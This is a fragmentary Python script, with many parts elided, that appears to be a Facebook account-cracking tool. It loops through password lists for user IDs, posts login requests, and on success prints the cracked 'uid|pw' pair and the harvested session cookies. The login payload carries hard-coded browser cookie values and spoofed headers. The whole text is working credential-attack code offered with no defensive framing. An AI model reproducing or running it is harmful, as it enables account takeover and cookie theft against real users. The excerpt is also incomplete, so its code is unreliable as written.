...
def graph(uid, name, pwx, tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            result = requests.post(url, headers=headers, data=data, allow_redirects=False).json()
            if "Session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
                print(f" {green}[SUMON-OK] {uid}|{pw}")
                print(f" {white}[COOKIES] {green}{coki}")
...
def mbasic(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            'email': uid,
            'cuid': '',
            'guid': 'f0b196808612dcc9f',
            'lgnjs': '1778900755',
            'lgnrnd': '214635_oOqQ',
            'locale': 'en_GB',
            'login_source': 'comet_login_header',
            'next': 'https://www.facebook.com/tracy.press.5',
            'skstamp': '',
            'timezone': '-225',
            ...
            'ps_l': '1',
            'ps_n': '1',
            'datr': 'LfYHau7LJVghzJIxgBtUTFss',
            'fr': '1odJD9EpaGFUh06JB.AWdr0mNCA_TBYNU59553pv0pxr4Tj_IucDvmlyge_vd1lFrRWk0.Bp6dUl..AAA.0.0.BqB_ae.AWfMJd5CYCsx2rCeeGfgjnFdl5c',
            'wd': '1181x776',}
            headers = {
            ...
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.facebook.com/tracy.press.5',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Microsoft Edge";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="149.0.4022.8", "Chromium";v="149.0.7827.14", "Not)A;Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
